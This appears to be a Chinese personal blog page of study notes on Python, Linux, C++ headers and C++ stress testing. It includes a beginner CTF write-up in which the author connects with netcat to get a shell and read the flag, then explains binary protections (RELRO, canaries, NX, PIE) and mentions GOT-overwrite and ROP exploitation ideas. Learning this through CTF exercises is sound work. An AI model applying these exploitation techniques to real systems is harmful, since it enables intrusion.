<p>要使用 math 或 cmath 函数必须先导入： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math <span class="comment">#导入</span></span><br><span class="line"><span class="keyword">import</span> cmath</span><br><span class="line"><span class="built_in">dir</span>(math) <span class="comment">#查看包中内容</span></span><br><span class="line"><span class="built_in">dir</span>(cmath)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">math.pow(x,y)</span><br></pre></td></tr></table></figure>
<p>返回浮点数，如果返回数字太大再进行类型转化会导致数学上的错误</p>
<h2 id="函数"><strong>函数</strong></h2>
<p>定义一个函数</p>
<ul>
<li>函数代码块以 <strong>def</strong> 关键词开头，后接函数标识符名称和圆括号<strong>()</strong>。</li>
<li>任何传入参数和自变量必须放在圆括号中间。圆括号之间可以用于定义参数。</li>
<li>函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明。</li>
<li>函数内容以冒号起始，并且缩进。</li>
<li><strong>return [表达式]</strong> 结束函数，选择性地返回一个值给调用方。不带表达式的return相当于返回None。</li>
</ul>
<p>可更改(mutable)与不可更改(immutable)对象</p>
<p>在 python 中，strings, tuples, 和 numbers 是不可更改的对象，而 list,dict 等则是可以修改的对象。</p>
<ul>
<li><strong>不可变类型：</strong>变量赋值 <strong>a=5</strong> 后再赋值 <strong>a=10</strong>，这里实际是新生成一个 int 值对象 10，再让 a 指向它，而 5 被丢弃，不是改变a的值，相当于新生成了a。</li>
<li><strong>可变类型：</strong>变量赋值 <strong>la=[1,2,3,4]</strong> 后再赋值 <strong>la[2]=5</strong> 则是将 list la 的第三个元素值更改，本身la没有动，只是其内部的一部分值被修改了。</li>
</ul>
<p>python 函数的参数传递：</p>
<ul>
<li><strong>不可变类型：</strong>类似 c++ 的值传递，如 整数、字符串、元组。如fun（a），传递的只是a的值，没有影响a对象本身。比如在 fun（a）内部修改 a 的值，只是修改另一个复制的对象，不会影响 a 本身。</li>
<li><strong>可变类型：</strong>类似 c++ 的引用传递，如 列表，字典。如 fun（la），则是将 la 真正的传过去，修改后fun外部的la也会受影响</li>
</ul>
<p>python 中一切都是对象，严格意义我们不能说值传递还是引用传递，我们应该说传不可变对象和传可变对象。</p>
<p>不定长参数 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span>(<span class="params"> arg1, *vartuple </span>):</span></span><br><span class="line">   <span class="string">&quot;打印任何传入的参数&quot;</span></span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;输出: &quot;</span></span><br><span class="line">   <span class="built_in">print</span> arg1</span><br><span class="line">   <span class="keyword">for</span> var <span class="keyword">in</span> vartuple:</span><br><span class="line">      <span class="built_in">print</span> var</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printinfo 函数</span></span><br><span class="line">printinfo( <span class="number">10</span> )</span><br><span class="line">printinfo( <span class="number">70</span>, <span class="number">60</span>, <span class="number">50</span> )</span><br></pre></td></tr></table></figure> 以上实例输出结果： 输出: 10 输出: 70 60 50</p>
<h2 id="python-模块"><strong>Python 模块</strong></h2>
<p><strong>import 语句</strong></p>
<p><strong>from…import 语句</strong> Python 的 from 语句让你从模块中导入一个指定的部分到当前命名空间中。 例如，要导入模块 fib 的 fibonacci 函数，使用如下语句：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fib <span class="keyword">import</span> fibonacci</span><br></pre></td></tr></table></figure>
<p><strong>from…import* 语句</strong> 把一个模块的所有内容全都导入到当前的命名空间</p>
<p><strong>搜索路径</strong></p>
<p>当你导入一个模块，Python 解析器对模块位置的搜索顺序是：</p>
<ul>
<li>1、当前目录</li>
<li>2、如果不在当前目录，Python 则搜索在 shell 变量 PYTHONPATH 下的每个目录。</li>
<li>3、如果都找不到，Python会察看默认路径。UNIX下，默认路径一般为/usr/local/lib/python/。</li>
</ul>
<p>模块搜索路径存储在 system 模块的 sys.path 变量中。变量里包含当前目录，PYTHONPATH和由安装过程决定的默认目录。</p>
<h2 id="pythonpath-变量"><strong>PYTHONPATH 变量</strong></h2>
<p>作为环境变量，PYTHONPATH 由装在一个列表里的许多目录组成。PYTHONPATH 的语法和 shell 变量 PATH 的一样。</p>
<p>在 Windows 系统，典型的 PYTHONPATH 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set PYTHONPATH=c:\python27\lib;</span><br></pre></td></tr></table></figure>
<p>在 UNIX 系统，典型的 PYTHONPATH 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set PYTHONPATH=/usr/local/lib/python</span><br></pre></td></tr></table></figure>
<p>python从入门到一天后假装会了，传销都不敢这么写，剩余部分会在遇到后补充</p>
<img src="/2020/12/17/python/2.jpg" class>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/17/AD-get-shell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冲击波">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="你们这样对得起孤胆英雄飞天狙吗">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/12/17/AD-get-shell/" class="post-title-link" itemprop="url">AD-get-shell</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-12-17 16:25:39" itemprop="dateCreated datePublished" datetime="2020-12-17T16:25:39+08:00">2020-12-17</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2022-02-24 13:59:11" itemprop="dateModified" datetime="2022-02-24T13:59:11+08:00">2022-02-24</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <img src="/2020/12/17/AD-get-shell/1.jpg" class>
<h3 id="方案一">方案一</h3>
<p>1.打开Linux 2.在浏览器打开题目网站，获取在线环境（一串数字） 3.下载附件 4.在附近所在文件夹nc 那串数字（删掉":"符号） 5.输入命令ls 6.输入命令cat flag 7.好了 8.？？？？？？？？？？？？？？？</p>
<p>尝试在本机获取在线环境，在linux nc，成功</p>
<p>尝试关闭在线环境，在linux nc ，失败</p>
<p>尝试删除附件，获取在线环境，nc ，成功</p>
<p><strong>结论：本题解法不止一种。获取在线环境，nc接入，得到答案。或者下载附件，离线操作。</strong></p>
<p>netcat通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，可以在脚本中以多种方式使用它。</p>
<p>netcat所做的就是在两台电脑之间建立链接并返回两个数据流。 能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。</p>
<p>用于打开一个shell 当在题目网页点击获取在线环境，云端便搭建了一个服务器 我在客户端仅仅简单连接到服务器（直观上感觉了进入一个文件夹）</p>
<p>$nc -n ip地址 ip端口 你会得到一个shell提示符在客户端</p>
<p>Linux nc命令 参数说明（用一个写一个）： -n 直接使用IP地址，而不通过域名服务器。 -p<通信端口> 设置本地主机使用的通信端口。</通信端口></p>
<h3 id="方案二">方案二</h3>
<p>下载附件，将附件重命名为a，在附件所在文件夹，输入命令checksec a <img src="/2020/12/17/AD-get-shell/2.png" class></p>
<p><strong>checksec：</strong> checksec是一个脚本软件，也就是用脚本写的一个文件，不到2000行，可用来学习shell。 checksec是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。 checksec的使用方法： checksec –file /usr/sbin/sshd</p>
<img src="/2020/12/17/AD-get-shell/3.png" class>
<p>（这张是我在网上随便找的）</p>
<p><strong>Arch</strong> 程序架构信息，判断是64位还是32位，exp编写的时候是p64还是p32</p>
<p><strong>RELRO</strong> Relocation Read-Onl（RELRO）此项技术主要针对GOT改写的攻击方式，它分成两种，Partial RELRO和FULL RELRO Partial RELRO容易受到攻击，例如攻击者可以atoi.got为system.plt进而输入/bin/sh00获得shell，Full RELRO使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
<p><strong>Stack-canary</strong> 栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞是，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行，当启用栈保护后，函数开始执行的时候先会往栈里插入类似cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行，攻击者在覆盖返回地址的时候往往会将cookie信息给覆盖掉，导致栈保护检车失败而阻止shellcode的执行，在linux中我们将cookie信息称为canary。因此我们需要获取 Canary 的值，或者防止触发 stack_chk_fail 函数，或是利用此函数。</p>
<p><strong>NX</strong> Non-Executable Memory，不可执行内存。了解 Linux 的都知道其文件有三种属性，即 rwx，而 NX 即没有 x 属性。如果没有 w 属性，我们就不能向内存单元中写入数据，如果没有 x 属性，写入的 shellcode 就无法执行。所以，我们此时应该使用其他方法来 pwn 掉程序，其中最常见的方法为 ROP (Return-Oriented Programming 返回导向编程)，利用栈溢出在栈上布置地址，每个内存地址对应一个 gadget，利用 ret 等指令进行衔接来执行某项功能，最终达到 pwn 掉程序的目的。 NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来，当攻击者在堆栈上部署自己的shellcode并触发时，智慧直接造成程序的崩溃，但是可以利用rop这种方法绕过</p>
<p><strong>PIE</strong> PTE（Position-Independent Executable，位置无关可执行文件）技术与ASLR技术类似，ASLR将程序运行时的堆栈以及共享库的加载地址随机化，而PIE及时则在编译时将程序编译为位置无关，即程序运行时各个段（如代码但等）加载的虚拟地址也是在装载时才确定，这就意味着。在PIE和ASLR同时开启的情况下，攻击者将对程序的内存布局一无所知，传统改写GOT表项也难以进行，因为攻击者不能获得程序的.got段的虚地址。若开始一般需在攻击时歇够地址信息</p>
<p>回到正题 <img src="/2020/12/17/AD-get-shell/2.png" class> 从图上可以看出它是一个64位程序，开了NX防护（堆栈不可执行）。唔，好的，基本信息咱们已经知道了，然后可以试着执行一下这个程序（Linux下）</p>
<p>Linux执行命令：./名字</p>
<p>提示权限不够</p>
<p>在当前文件下输入命令：chmod 777 名字</p>
<p>再次Linux执行命令：./名字</p>
<img src="/2020/12/17/AD-get-shell/4.png" class>
<p><strong>成功执行程序。。。。不明所以。。。老子flag呢？？？？ 到头来还是要用nc，这个附件不讲武德，欺骗老子感情</strong></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/16/%E5%AD%A6%E4%B9%A0Linux/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冲击波">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="你们这样对得起孤胆英雄飞天狙吗">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/12/16/%E5%AD%A6%E4%B9%A0Linux/" class="post-title-link" itemprop="url">学习Linux</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-12-16 21:00:38" itemprop="dateCreated datePublished" datetime="2020-12-16T21:00:38+08:00">2020-12-16</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2022-02-24 13:46:36" itemprop="dateModified" datetime="2022-02-24T13:46:36+08:00">2022-02-24</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="vmubuntu">VM+ubuntu</h1>
<p>我在系统中找到的文件bin boot cdrom dev etc home lib lib32 lib64 libx32 lost+found media mnt opt proc root run sbin snap srv swapfile sys tmp usr var home 是家目录，通常您自己创建的文件，都保存在这里 usr 应用程序目录。大部分的软件都安装在这里 var 一些服务器方面的应用</p>
<h4 id="linux有特定的语法结构">linux有特定的语法结构</h4>
<p>用中文举例子 我们郑重地推荐您Ubuntu/Linux！</p>
<p>这个句子的语法尽管简单，却是大部分的命令行采用的句型。让我们看一下，这个句子里都有些什么：</p>
<p>我们</p>
<p>主语，Linux命令的执行者只有一个，所以主语一概省略。</p>
<p>推荐</p>
<p>一个动词，作为谓语而存在。Linux命令中，这一部分是必须的。这一部分也是不同命令之间最根本的区别方式，所以它通常作为命令名，写在最前面。</p>
<p>郑重的</p>
<p>状语，用来修饰谓语。与之相对应，Linux命令可以使用参数来精细调节程序的行为。为了与命令的操作对象相区别，参数前通常要加 - 或者 -- 符号。原则上，在命令名之后，参数的位置可以随意，但是为了养成一个良好的习惯，建议在命令名后直接跟参数。</p>
<p>您 Ubuntu/linux</p>
<p>这两个部分都是宾语，它们是命令的操作对象。大部分的命令只有一个操作对象，也有一些命令是双宾语结构的，具有一个直接宾语和一个间接宾语。比如 拷贝 这个命令 cp (copy)</p>
<p>分隔符</p>
<p>我们的汉语是象形文字，没有分隔符。但是所有的拼音文字中都有分隔符，来分隔单词。Linux命令中同样使用空格作分隔符。</p>
<p>cp a /home 表示把当前目录下的 a 文件，拷贝到 /home 目录下。（命令的不同部分使用空格分隔，连续的空格视为一个空格）</p>
<p>上面的那句话，翻译成Linux的命令，应该是这个样子的：</p>
<p>推荐 --郑重的 您 Ubuntu/Linux （按照传统，“-”后跟简写为单个字母的参数，“--”后跟完整单词的参数。不过也有例外：）</p>
<h4 id="路径相关命令">路径相关命令</h4>
<p>cd (change directory) 更改目录。</p>
<p>pwd (print working directory)显示当前路径。</p>
<p>ls (list) 显示当前目录中的文件列表。</p>
<h4 id="软件">软件</h4>
<p>Linux中没有*<strong>注册表*</strong>这个概念。安装软件，理论上讲，只要拷贝所有相关文件，并运行它的主程序就可以了。</p>
<p>按照传统，一个软件通常分别拷贝到同级目录下的 bin、etc、lib、share等文件夹。</p>
<p><strong>Bin</strong> 可执行文件，程序的可执行文件通常在这个目录下。在环境变量中设定搜索路径，就可以直接执行，而不需要定位其路径。</p>
<p><strong>Etc</strong> 配置文件，大部分系统程序的配置文件保存于 /etc 目录，便于集中修改。</p>
<p><strong>Lib</strong> 库文件，集中在一起，方便共享给不同程序。相较不同的软件单独保存库文件，能够节约一些磁盘空间。</p>
<p><strong>Share</strong> 程序运行所需要的其它资源，例如图标、文本。这部分文件是专有的，不需要共享；而且目录结构相对复杂，混放在一起比较混乱，所以单独存放。</p>
<h4 id="隐藏文件">隐藏文件</h4>
<p>Linux下，名称中第一个字符为 . 的文件或者文件夹，系统默认情况下将它们隐藏起来</p>
<h4 id="新建文件">新建文件</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; text.py</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/13/cpp%E8%87%AA%E5%AE%9A%E4%B9%89%E5%A4%B4%E6%96%87%E4%BB%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冲击波">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="你们这样对得起孤胆英雄飞天狙吗">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/12/13/cpp%E8%87%AA%E5%AE%9A%E4%B9%89%E5%A4%B4%E6%96%87%E4%BB%B6/" class="post-title-link" itemprop="url">cpp自定义头文件</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-12-13 16:24:17" itemprop="dateCreated datePublished" datetime="2020-12-13T16:24:17+08:00">2020-12-13</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2022-09-08 13:43:45" itemprop="dateModified" datetime="2022-09-08T13:43:45+08:00">2022-09-08</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>自定义的头文件中不能定义main()函数</p>
<p>目前我将自定义的头文件用于存储我自己写的函数，目前包括快速幂、高精度、全排</p>
<p>在头文件与源文件共享全局变量，且在头文件全局变量先于源文件定义</p>
<p>将cpp自带的头文件文件全部放入自定义的头文件中，“using namespace std;”也能放里头。可以将它简单理解为顺序“执行”</p>
<p>进度 <img src="/2020/12/13/cpp%E8%87%AA%E5%AE%9A%E4%B9%89%E5%A4%B4%E6%96%87%E4%BB%B6/eg1.png" class></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/12/%E5%AF%B9%E6%8B%8D/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冲击波">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="你们这样对得起孤胆英雄飞天狙吗">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/12/12/%E5%AF%B9%E6%8B%8D/" class="post-title-link" itemprop="url">c++对拍</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-12-12 16:52:41" itemprop="dateCreated datePublished" datetime="2020-12-12T16:52:41+08:00">2020-12-12</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2022-09-08 13:40:55" itemprop="dateModified" datetime="2022-09-08T13:40:55+08:00">2022-09-08</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="在devc中对拍">在devC++中对拍</h1>
<h3 id="基础">基础</h3>
<p>尝试.cpp 尝试.exe 暴力.cpp 暴力.exe 数据.cpp 数据.exe 对比.cpp 对比.exe 数据.in（来自数据.exe的执行，用于尝试.exe和暴力.exe的执行） 暴力数据.out（来自暴力.exe的执行，用于对比.exe的执行） 尝试数据.in（来自尝试.exe的执行，用于对比.exe的执行） 将以上全部放入同一个文件夹（方便精简代码）（如若不然，需要在代码中写明每个文件的地址）</p>
<p>对比.cpp代码（文件输入输出） <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;数据.exe&quot;</span>);</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;暴力.exe&quot;</span>);</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;尝试.exe&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">system</span>(<span class="string">&quot;fc be1.out be2.out&quot;</span>))<span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">//当fc返回1时，说明这时数据不一样</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>运行对比.cpp或直接运行对比.exe <img src="/2020/12/12/%E5%AF%B9%E6%8B%8D/%E4%BE%8B%E5%AD%90.png" class> 找不到差异，说明这两份代码输出的两个文件是一样的。 那么我们可以一直拍着，如果长时间都是找不到差异，那么你写的正解就可能是对的了。 如果找到差异，它会分别返回两个文件的数据（这个是真滴nb，不是假的nb），这样我们就有了一组错误数据，方便我们 debug 。</p>
<h3 id="进阶">进阶</h3>
<p>大多比赛用不上文件输入输出，额外去写一堆文件输入输出浪费时间，建议采用标准输入输出 （需用到<code>#include&lt;cstdlib&gt;</code> ）</p>
<p>对比.cpp代码（标准输入输出） <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) <span class="comment">//一直循环，直到找到不一样的数据</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;数据.exe &gt; be.in&quot;</span>);  <span class="comment">//运行 数据.exe，把结果输出（&gt;）到 be.in 中。</span></span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;尝试.exe &lt; be.in &gt; be1.out&quot;</span>);<span class="comment">//运行 尝试.exe，从 be.in 中读入（&lt;）数据，把结果输出（&gt;）到 be1.in 中。</span></span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;暴力.exe &lt; be.in &gt; be2.out&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">system</span>(<span class="string">&quot;fc be1.out be2.out&quot;</span>))<span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">//不需要在其他文件写文件输入输出</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>节约对拍次数 在对拍时，你有没有发现在 cmd 的黑色框框里面，“找不到差异” 这几行输出的很快，看起来对拍的频率好像很高的样子。实际上，这样浪费了很多次对拍，数据生成需要一定的时间，而文件的读取输出等都需要一定时间。但是两个输出文件的对比却在不停地运行着，数据生成器生成的文件在一定的时间内是相同的，这样就浪费了许多次对拍。（更重要的是没法同一个点测n次，写不了无敌版） 为此，我们可以使每次对拍完毕后休眠1秒，给四个程序留给一定的缓冲时间，使得每次对拍时，数据生成器生成的数据都不同。 那么，我们可以使用 <code>#include&lt;windows.h&gt;</code>库里的 Sleep(t) ，t为时间，单位是毫秒。它可以使程序休眠 t 毫秒。我们可以在每次对拍之后加上<code>Sleep(1000);</code> ，这样每次对拍之后休眠1秒，就不会出现浪费对拍的情况了。</p>
<p>超时测试 用一个计时函数"clock()"，来计算我们写的正解用的时间，判断它是否超时（本地测出的时间和评测机测的时间一般不同），并把所用时间在对拍程序上体现出来。</p>
<p>不必每次发现错误就退出，给定有限次数测试也行。还可以给把一个通过的数据当作一个测试点，还可以给他赋予编号，这些都能在对拍程序直观地体现出来。</p>
<p>对比.cpp代码（无敌版，没有人比我更懂无敌） <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span> <span class="comment">//md万用库就这</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n; cin &gt;&gt; n; <span class="comment">//输入要测试几组数据 </span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; ++i)</span><br><span class="line">	&#123; </span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;数据.exe &gt; be.in&quot;</span>);</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;暴力.exe &lt; be.in &gt; be2.out&quot;</span>);</span><br><span class="line">		<span class="keyword">double</span> begin=<span class="built_in">clock</span>();</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;尝试.exe &lt; be.in &gt; be1.out&quot;</span>);</span><br><span class="line">		<span class="keyword">double</span> end=<span class="built_in">clock</span>();</span><br><span class="line">		<span class="keyword">double</span> t=(end-begin);</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">system</span>(<span class="string">&quot;fc be1.out be2.out&quot;</span>))cout &lt;&lt; i &lt;&lt; <span class="string">&quot; WA&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (t&gt;<span class="number">1000</span>)cout &lt;&lt; i &lt;&lt; <span class="string">&quot; TLE &quot;</span> &lt;&lt; t &lt;&lt; endl &lt;&lt; endl;<span class="comment">//clock()单位是毫秒</span></span><br><span class="line">		<span class="keyword">else</span> cout &lt;&lt; i &lt;&lt; <span class="string">&quot; AC &quot;</span> &lt;&lt; t &lt;&lt; endl &lt;&lt; endl; </span><br><span class="line">		<span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>结果 <img src="/2020/12/12/%E5%AF%B9%E6%8B%8D/%E4%BE%8B%E5%AD%902.png" class></p>
<h1 id="在vsc中对拍">在VSC中对拍</h1>
<p>遇到太多问题，一时语塞</p>
<img src="/2020/12/12/%E5%AF%B9%E6%8B%8D/%E5%BF%83%E5%BE%97%E4%BD%93%E4%BC%9A1.jpg" class>
<img src="/2020/12/12/%E5%AF%B9%E6%8B%8D/%E5%BF%83%E5%BE%97%E4%BD%93%E4%BC%9A2.jpg" class>
<h2 id="如何解决vs2019中freopen等函数报错问题">如何解决vs2019中freopen等函数报错问题</h2>
<p>vs2019中使用freopen、fopen、sprintf等函数总是出现安全问题： error C4996: ‘xxxxx’: This function or variable may be unsafe. Consider using xxxxxx instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.</p>
<p>解决方法 （1）打开项目里的属性 （2）配置属性——C/C++——预处理器——预处理器定义中加入一条指令：_CRT_SECURE_NO_WARNINGS，确认即可。</p>
<h2 id="兄弟这些我都不会">兄弟，这些我都不会</h2>
<p>一个解决方案可以包含多个项目 其中有一个是主项目 每个项目中只能有一个主函数</p>
<img src="/2020/12/12/%E5%AF%B9%E6%8B%8D/eg1.png" class>
